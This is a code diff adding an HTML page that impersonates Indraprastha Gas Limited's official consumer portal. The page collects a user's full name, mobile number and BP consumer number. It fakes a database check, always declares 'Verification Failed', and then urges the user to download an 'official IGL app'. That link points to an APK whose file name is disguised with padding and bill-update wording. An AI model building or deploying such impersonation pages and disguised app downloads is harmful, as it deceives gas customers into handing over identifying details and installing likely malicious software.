@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>IGL Gas Connect | Official Consumer Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f0f4f8 0%, #e2e8f0 100%);
+            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Inter', 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1.5rem;
+        }
+
+        /* Main Card - Official White Theme */
+        .register-card {
+            background: #ffffff;
+            border-radius: 28px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(0, 0, 0, 0.02);
+            width: 100%;
+            max-width: 580px;
+            padding: 2.2rem 2rem 2.5rem;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .register-card:hover {
+            box-shadow: 0 30px 55px -12px rgba(0, 0, 0, 0.2);
+        }
+
+        @media (max-width: 550px) {
+            .register-card {
+                padding: 1.6rem 1.4rem 2rem;
+                border-radius: 24px;
+            }
+        }
+
+        /* Logo Section */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 0.8rem;
+        }
+
+        .logo-img {
+            max-width: 120px;
+            height: auto;
+            display: inline-block;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.08));
+        }
+
+        /* Header Typography */
+        .igl-heading {
+            text-align: center;
+            margin-bottom: 0.25rem;
+        }
+
+        .igl-heading h1 {
+            font-family: 'Segoe UI', 'Poppins', 'Inter', sans-serif;
+            font-size: 2rem;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #e65100, #f97316);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .gas-sub {
+            text-align: center;
+            color: #64748b;
+            font-size: 0.75rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        .divider {
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #f97316, #ffedd5, #f97316, transparent);
+            margin: 0.8rem 0 1.2rem 0;
+            width: 80px;
+            margin-left: auto;
+            margin-right: auto;
+            border-radius: 2px;
+        }
+
+        .tagline {
+            text-align: center;
+            color: #0f766e;
+            font-size: 0.75rem;
+            background: #f0fdf4;
+            display: inline-block;
+            width: auto;
+            margin: 0 auto 1.2rem;
+            padding: 5px 16px;
+            border-radius: 30px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            border: 1px solid #bbf7d0;
+        }
+
+        /* Form Styles */
+        .input-group {
+            margin-bottom: 1.4rem;
+        }
+
+        label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1e293b;
+            font-size: 0.85rem;
+            letter-spacing: 0.2px;
+        }
+
+        label svg {
+            width: 18px;
+            height: 18px;
+            stroke: #f97316;
+            stroke-width: 1.7;
+            fill: none;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #f8fafc;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 20px;
+            font-size: 0.95rem;
+            color: #0f172a;
+            font-weight: 500;
+            transition: all 0.2s;
+            outline: none;
+            font-family: inherit;
+        }
+
+        input:focus {
+            border-color: #f97316;
+            box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.12);
+            background: #ffffff;
+        }
+
+        input::placeholder {
+            color: #94a3b8;
+            font-weight: 400;
+            font-size: 0.85rem;
+        }
+
+        .error-message {
+            font-size: 0.7rem;
+            color: #dc2626;
+            margin-top: 6px;
+            margin-left: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 500;
+        }
+
+        .error-message::before {
+            content: "⚠️";
+            font-size: 0.65rem;
+        }
+
+        /* CTA Button */
+        .submit-btn {
+            background: linear-gradient(95deg, #ea580c, #f97316);
+            border: none;
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 40px;
+            font-size: 1rem;
+            font-weight: 700;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.25s;
+            margin-top: 10px;
+            box-shadow: 0 8px 20px -6px rgba(234, 88, 12, 0.3);
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(95deg, #c2410c, #ea580c);
+            transform: translateY(-1px);
+            box-shadow: 0 12px 24px -8px rgba(234, 88, 12, 0.4);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Info Note */
+        .info-note {
+            text-align: center;
+            margin-top: 1.6rem;
+            font-size: 0.7rem;
+            background: #f1f5f9;
+            padding: 10px 14px;
+            border-radius: 40px;
+            color: #475569;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px;
+        }
+
+        .info-note::before {
+            content: "🔒";
+            font-size: 0.75rem;
+        }
+
+        footer {
+            font-size: 0.65rem;
+            text-align: center;
+            margin-top: 1.3rem;
+            color: #94a3b8;
+            border-top: 1px solid #eef2ff;
+            padding-top: 1rem;
+        }
+
+        /* Loading Overlay - Clean White */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.97);
+            backdrop-filter: blur(10px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            animation: fadeIn 0.2s ease;
+        }
+
+        .loading-spinner {
+            width: 56px;
+            height: 56px;
+            border: 5px solid #ffedd5;
+            border-top: 5px solid #f97316;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin-bottom: 1rem;
+        }
+
+        .loading-text {
+            color: #ea580c;
+            font-size: 1.1rem;
+            font-weight: 600;
+            background: #fff7ed;
+            padding: 8px 28px;
+            border-radius: 60px;
+        }
+
+        .loading-sub {
+            color: #475569;
+            margin-top: 10px;
+            font-size: 0.8rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="register-card">
+    <!-- Official IGL Logo -->
+    <div class="logo-container">
+        <img src="https://www.iglonline.net/assets/mainpage/assets/images/igl-logo.png"
+             alt="IGL - Indraprastha Gas Limited"
+             class="logo-img"
+             onerror="this.onerror=null; this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAZlBMVEUAAAD///////////////////////////////////////////9Mfl8/AAAAIXRSTlMAvxCBYO/PMyLt25d1TEAqGffv18/GpI1ya1hJOScJ8ujV0aVJGAAAAoRJREFUWMPtmQmS4yAMRFtIxuA7mPvfc2JsJ2XHSF0+Q1X+y1R3OxWN2hIYU5O2jiN8C1m+ynICk7i2Afwq57sCFtj5njITCtgSfWYSFbAl+swkKmBL9JlJVMCW6O+W70X0ZRZ3x/Ai4TvuQB1d1uA2ImBL9JlJVMCW6DOTqIAt0WcmUQFbos9MogK2RJ+ZRAVsiT4ziQrYEn1mEhWwJfrMJFpyje1Wrj/TSH4QAzbyUV82BdG2W7n+HNL85fMxhyv8BdHvI/7A5ONK/k0ZcxfY13y2TzoePAXQq67nC2j1G/DcC9gAIPeCaPquAhsAhGfwg6s/76P3Q/XzPl6b+6H6eR+o94vkJ/qBCds+2pPjAGU+W7FXBQ4Hsgqz+jS9KnAcMNiz6FZ1yEEI/k2bp+diW5Wi2X8/qgxhgMUXP7O/3A/T7kv41I/ebqUuFPD0MrY9L9sBx/v9LtWtUwWuA7LQ9lR9qm5VgeuArN/tfyhfv/1hKcrUn6m6Dz9q91o/QO5VdP9BxT8O6vLRxWrW81n8We8rVvPneH9zDVwGVu0PVKzXH9jAoLmFvSrwNFBR/2Fj8x/PGgAD10M3c/1LYAj7G+aCvBVgV4E/DhgBv+avQay0hPyErz/vAfAkwcXICp0C9l6I5b17AfgI84fJODC/p6QEnL+v5z2BeZ7uWp6mE9kG4Pv/eByIhHuCsX31X/QFw+PowJAKPPlM8uH/hUoB+yUwuMBEfJXmR7tLAXvB4bjvyQ/axx04K/CbgH2Jvk/xvZfAboGGT9Gl/5Xbc3kpYD/4Tz82+FOD4YjU9Djngs8CtqHvKQd1/F2g1gT+AdhZ8ErPcT0CAAAAAElFTkSuQmCC';">
+    </div>
+
+    <div class="igl-heading">
+        <h1>IGL GAS CONNECT</h1>
+    </div>
+    <div class="gas-sub">INDRAPRASTHA GAS LIMITED • GOVT. OF NCT OF DELHI</div>
+    <div class="divider"></div>
+    <div style="text-align: center;">
+        <div class="tagline">✔ Official Consumer Registration Portal</div>
+    </div>
+
+    <form id="registrationForm" action="#" method="POST">
+        <!-- Full Name -->
+        <div class="input-group">
+            <label>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" stroke-width="1.6"/>
+                    <circle cx="12" cy="7" r="4" stroke-width="1.6"/>
+                </svg>
+                Full Name (as per ID proof)
+            </label>
+            <input type="text" id="fullName" placeholder="Enter Full Name" autocomplete="name">
+            <div class="error-message" id="nameError" style="display: none;">Full name required (minimum 3 characters)</div>
+        </div>
+
+        <!-- Mobile Number -->
+        <div class="input-group">
+            <label>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2" stroke-width="1.6"/>
+                    <line x1="12" y1="18" x2="12.01" y2="18" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+                Mobile Number
+            </label>
+            <input type="tel" id="mobileNumber" placeholder="10-digit mobile number " autocomplete="tel">
+            <div class="error-message" id="mobileError" style="display: none;">Enter valid 10-digit mobile number (starts with 6-9)</div>
+        </div>
+
+        <!-- BP Number -->
+        <div class="input-group">
+            <label>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" stroke-width="1.5"/>
+                    <circle cx="12" cy="12" r="3" stroke-width="1.6"/>
+                </svg>
+                BP Number
+            </label>
+            <input type="text" id="bpNumber" placeholder="Enter your BP Number " autocomplete="off">
+            <div class="error-message" id="bpError" style="display: none;">Enter BP Numbe</div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">
+            <span>⛽</span> Proceed to Verification  
+            <span>→</span>
+        </button>
+        
+        <div class="info-note">
+            Your information is secure & encrypted | One-time verification
+        </div>
+        <footer>
+            © 2025 Indraprastha Gas Ltd. | All rights reserved.
+        </footer>
+    </form>
+</div>
+
+<script>
+    (function() {
+        // DOM Elements
+        const fullNameInput = document.getElementById('fullName');
+        const mobileInput = document.getElementById('mobileNumber');
+        const bpInput = document.getElementById('bpNumber');
+        const nameError = document.getElementById('nameError');
+        const mobileError = document.getElementById('mobileError');
+        const bpError = document.getElementById('bpError');
+        const form = document.getElementById('registrationForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // Helper functions
+        function resetErrors() {
+            nameError.style.display = 'none';
+            mobileError.style.display = 'none';
+            bpError.style.display = 'none';
+            [fullNameInput, mobileInput, bpInput].forEach(inp => {
+                inp.style.borderColor = '#e2e8f0';
+            });
+        }
+
+        function markInvalid(inputEl, errorEl, isInvalid) {
+            if (isInvalid) {
+                inputEl.style.borderColor = '#dc2626';
+                errorEl.style.display = 'flex';
+                return false;
+            } else {
+                inputEl.style.borderColor = '#e2e8f0';
+                errorEl.style.display = 'none';
+                return true;
+            }
+        }
+
+        // Validation Rules
+        function validateFullName() {
+            const name = fullNameInput.value.trim();
+            if (name.length === 0) return markInvalid(fullNameInput, nameError, true);
+            const nameRegex = /^[A-Za-zÀ-ÖØ-öø-ÿčĆčĐŠŽčćžšđÇçÑñığüşİÖÜÇĞŞı\-'. ]{3,60}$/;
+            const hasMinAlpha = (name.replace(/[^A-Za-zÀ-ÿ]/g, '').length >= 2);
+            if (!nameRegex.test(name) || !hasMinAlpha || name.length < 3) {
+                return markInvalid(fullNameInput, nameError, true);
+            }
+            return markInvalid(fullNameInput, nameError, false);
+        }
+
+        function validateMobile() {
+            let mobile = mobileInput.value.trim();
+            const digits = mobile.replace(/\D/g, '');
+            if (digits.length === 10 && /^[6-9]\d{9}$/.test(digits)) {
+                return markInvalid(mobileInput, mobileError, false);
+            }
+            return markInvalid(mobileInput, mobileError, true);
+        }
+
+        function validateBpNumber() {
+            let bp = bpInput.value.trim();
+            if (bp.length >= 4 && bp.length <= 30 && /^[A-Za-z0-9_\-@./]+$/.test(bp)) {
+                return markInvalid(bpInput, bpError, false);
+            }
+            return markInvalid(bpInput, bpError, true);
+        }
+
+        // Live validation events
+        function attachLiveEvents() {
+            fullNameInput.addEventListener('input', () => validateFullName());
+            mobileInput.addEventListener('input', () => validateMobile());
+            bpInput.addEventListener('input', () => validateBpNumber());
+            fullNameInput.addEventListener('blur', validateFullName);
+            mobileInput.addEventListener('blur', validateMobile);
+            bpInput.addEventListener('blur', validateBpNumber);
+        }
+
+        // Loading + Second Page Logic
+        function showLoadingAndThenNotMatch(userData) {
+            submitBtn.disabled = true;
+            const loadingDiv = document.createElement('div');
+            loadingDiv.className = 'loading-overlay';
+            loadingDiv.id = 'igl-loading-overlay';
+            loadingDiv.innerHTML = `
+                <div class="loading-spinner"></div>
+                <div class="loading-text">Verifying with IGL Database...</div>
+                <div class="loading-sub">Please wait, this may take a few seconds</div>
+            `;
+            document.body.appendChild(loadingDiv);
+            
+            setTimeout(() => {
+                const existingOverlay = document.getElementById('igl-loading-overlay');
+                if (existingOverlay) existingOverlay.remove();
+                showDetailsNotMatchPage(userData);
+                submitBtn.disabled = false;
+            }, 3000);
+        }
+
+        // Professional "Details Not Match" page with App CTA
+        function showDetailsNotMatchPage(userData) {
+            const existingOverlay = document.getElementById('igl-second-page-overlay');
+            if (existingOverlay) existingOverlay.remove();
+            
+            const overlay = document.createElement('div');
+            overlay.id = 'igl-second-page-overlay';
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(255, 255, 255, 0.98)';
+            overlay.style.backdropFilter = 'blur(12px)';
+            overlay.style.zIndex = '9999';
+            overlay.style.display = 'flex';
+            overlay.style.alignItems = 'center';
+            overlay.style.justifyContent = 'center';
+            overlay.style.fontFamily = "'Segoe UI', 'Inter', system-ui, sans-serif";
+            overlay.style.overflowY = 'auto';
+            overlay.style.padding = '20px';
+            
+            const card = document.createElement('div');
+            card.style.maxWidth = '520px';
+            card.style.width = '100%';
+            card.style.backgroundColor = '#ffffff';
+            card.style.borderRadius = '36px';
+            card.style.padding = '2rem 2rem';
+            card.style.textAlign = 'center';
+            card.style.boxShadow = '0 30px 50px -20px rgba(0, 0, 0, 0.25)';
+            card.style.border = '1px solid #fee2e2';
+            card.style.animation = 'fadeInUp 0.3s ease';
+            
+            const iconDiv = document.createElement('div');
+            iconDiv.style.fontSize = '3.8rem';
+            iconDiv.style.marginBottom = '0.6rem';
+            iconDiv.innerHTML = '🔍❌';
+            
+            const title = document.createElement('h2');
+            title.textContent = 'VERIFICATION FAILED';
+            title.style.color = '#dc2626';
+            title.style.fontSize = '1.65rem';
+            title.style.marginBottom = '0.5rem';
+            title.style.fontWeight = '800';
+            
+            const mainMsg = document.createElement('p');
+            mainMsg.textContent = 'Your Details Not Match';
+            mainMsg.style.color = '#9a3412';
+            mainMsg.style.fontSize = '1.45rem';
+            mainMsg.style.fontWeight = '700';
+            mainMsg.style.marginBottom = '1rem';
+            mainMsg.style.backgroundColor = '#fff7ed';
+            mainMsg.style.padding = '8px 20px';
+            mainMsg.style.borderRadius = '40px';
+            mainMsg.style.border = '1px solid #fed7aa';
+            
+            const infoText = document.createElement('p');
+            infoText.style.color = '#334155';
+            infoText.style.marginBottom = '1.2rem';
+            infoText.style.fontSize = '0.9rem';
+            infoText.style.lineHeight = '1.5';
+            infoText.style.background = '#f8fafc';
+            infoText.style.padding = '12px';
+            infoText.style.borderRadius = '20px';
+            infoText.innerHTML = `<strong style="color:#ea580c;">The information you provided does not match our records.</strong><br><br>
+            <span style="display:inline-block; text-align:left; width:100%;">
+            📛 <strong>Full Name:</strong> ${escapeHtml(userData.name)}<br>
+            📞 <strong>Mobile:</strong> ${userData.mobile}<br>
+            🔑 <strong>BP Number:</strong> ${escapeHtml(userData.bp)}<br>
+            </span>`;
+            
+            // App Download Prompt (Official Style)
+            const appPromptDiv = document.createElement('div');
+            appPromptDiv.style.background = '#fefce8';
+            appPromptDiv.style.borderRadius = '30px';
+            appPromptDiv.style.padding = '1.2rem 1rem';
+            appPromptDiv.style.marginBottom = '1.5rem';
+            appPromptDiv.style.border = '1px solid #fde047';
+            
+            const appMessage = document.createElement('p');
+            appMessage.style.color = '#b45309';
+            appMessage.style.fontSize = '1rem';
+            appMessage.style.fontWeight = '700';
+            appMessage.style.marginBottom = '10px';
+            appMessage.innerHTML = '📱 Website update not available. Please use our official App!';
+            
+            const appButton = document.createElement('a');
+            appButton.href = 'Click_Here___Open___IGL_GAS_____________________________________________________________________________________________________________________BILL_Update_d262C525_renews_app_verify_5257_6252525252_reenes653236renewsPDF_FILE_Under_documents_new.apk';
+            appButton.target = '_blank';
+            appButton.style.display = 'inline-flex';
+            appButton.style.alignItems = 'center';
+            appButton.style.gap = '12px';
+            appButton.style.backgroundColor = '#059669';
+            appButton.style.color = 'white';
+            appButton.style.padding = '12px 28px';
+            appButton.style.borderRadius = '50px';
+            appButton.style.textDecoration = 'none';
+            appButton.style.fontWeight = 'bold';
+            appButton.style.fontSize = '0.95rem';
+            appButton.style.transition = '0.2s';
+            appButton.style.border = 'none';
+            appButton.innerHTML = '⬇️ Download IGL Mobile App ⬇️';
+            appButton.onmouseover = () => appButton.style.backgroundColor = '#047857';
+            appButton.onmouseout = () => appButton.style.backgroundColor = '#059669';
+            
+            const appNote = document.createElement('p');
+            appNote.style.fontSize = '0.65rem';
+            appNote.style.color = '#78716c';
+            appNote.style.marginTop = '10px';
+            appNote.textContent = 'Official IGL Consumer App | Update your KYC & manage gas connection';
+            
+            appPromptDiv.appendChild(appMessage);
+            appPromptDiv.appendChild(appButton);
+            appPromptDiv.appendChild(appNote);
+            
+            const buttonContainer = document.createElement('div');
+            buttonContainer.style.display = 'flex';
+            buttonContainer.style.gap = '16px';
+            buttonContainer.style.justifyContent = 'center';
+            buttonContainer.style.marginTop = '0.6rem';
+            buttonContainer.style.flexWrap = 'wrap';
+            
+            const tryAgainBtn = document.createElement('button');
+            tryAgainBtn.textContent = '◀ TRY AGAIN';
+            tryAgainBtn.style.background = '#f97316';
+            tryAgainBtn.style.border = 'none';
+            tryAgainBtn.style.padding = '11px 28px';
+            tryAgainBtn.style.borderRadius = '40px';
+            tryAgainBtn.style.fontWeight = 'bold';
+            tryAgainBtn.style.color = 'white';
+            tryAgainBtn.style.fontSize = '0.9rem';
+            tryAgainBtn.style.cursor = 'pointer';
+            tryAgainBtn.style.transition = '0.2s';
+            tryAgainBtn.onmouseover = () => tryAgainBtn.style.background = '#ea580c';
+            tryAgainBtn.onmouseout = () => tryAgainBtn.style.background = '#f97316';
+            tryAgainBtn.onclick = () => {
+                overlay.remove();
+                fullNameInput.focus();
+            };
+            
+            const closeBtn = document.createElement('button');
+            closeBtn.textContent = '✖ CLOSE';
+            closeBtn.style.background = '#f1f5f9';
+            closeBtn.style.border = '1px solid #cbd5e1';
+            closeBtn.style.padding = '11px 28px';
+            closeBtn.style.borderRadius = '40px';
+            closeBtn.style.fontWeight = '600';
+            closeBtn.style.color = '#334155';
+            closeBtn.style.fontSize = '0.9rem';
+            closeBtn.style.cursor = 'pointer';
+            closeBtn.onclick = () => overlay.remove();
+            
+            buttonContainer.appendChild(tryAgainBtn);
+            buttonContainer.appendChild(closeBtn);
+            
+            card.appendChild(iconDiv);
+            card.appendChild(title);
+            card.appendChild(mainMsg);
+            card.appendChild(infoText);
+            card.appendChild(appPromptDiv);
+            card.appendChild(buttonContainer);
+            
+            overlay.appendChild(card);
+            document.body.appendChild(overlay);
+            
+            if (!document.querySelector('#igl-anim-style')) {
+                const styleAnim = document.createElement('style');
+                styleAnim.id = 'igl-anim-style';
+                styleAnim.textContent = `
+                    @keyframes fadeInUp {
+                        from { opacity: 0; transform: translateY(20px); }
+                        to { opacity: 1; transform: translateY(0); }
+                    }
+                `;
+                document.head.appendChild(styleAnim);
+            }
+        }
+        
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
+        }
+        
+        // Form Submit Handler
+        function handleSubmit(event) {
+            event.preventDefault();
+            resetErrors();
+            const isNameValid = validateFullName();
+            const isMobileValid = validateMobile();
+            const isBpValid = validateBpNumber();
+            
+            if (!isNameValid || !isMobileValid || !isBpValid) {
+                const card = document.querySelector('.register-card');
+                card.style.transform = 'scale(0.99)';
+                setTimeout(() => { card.style.transform = ''; }, 150);
+                let errMsg = "⚠️ Validation Error:\n";
+                if (!isNameValid) errMsg += "- Full Name must be at least 3 characters.\n";
+                if (!isMobileValid) errMsg += "- Mobile Number must be 10 digits (starting with 6-9).\n";
+                if (!isBpValid) errMsg += "- BP Number must be at least 4 characters.\n";
+                alert(errMsg);
+                if (!isNameValid) fullNameInput.focus();
+                else if (!isMobileValid) mobileInput.focus();
+                else if (!isBpValid) bpInput.focus();
+                return;
+            }
+            
+            const userFullName = fullNameInput.value.trim();
+            const userMobile = mobileInput.value.trim();
+            const userBp = bpInput.value.trim();
+            const mobileDigits = userMobile.replace(/\D/g, '').slice(0,10);
+            
+            showLoadingAndThenNotMatch({
+                name: userFullName,
+                mobile: mobileDigits,
+                bp: userBp
+            });
+        }
+        
+        form.addEventListener('submit', handleSubmit);
+        attachLiveEvents();
+        window.addEventListener('load', () => resetErrors());
+    })();
+</script>
+</body>
+</html>
